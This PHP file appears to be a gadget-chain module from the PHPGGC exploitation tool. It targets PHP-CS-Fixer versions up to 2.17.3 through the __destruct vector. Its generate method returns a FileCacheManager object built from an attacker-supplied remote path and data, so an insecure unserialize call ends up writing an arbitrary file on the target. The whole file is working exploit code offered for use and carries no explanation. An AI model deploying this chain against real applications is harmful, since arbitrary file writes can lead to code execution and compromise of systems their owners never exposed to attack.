<?php

namespace GadgetChain\PHPCSFixer;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '<= 2.17.3';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'create a file in json format';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \PhpCsFixer\Cache\FileCacheManager($path, $data);
    }
}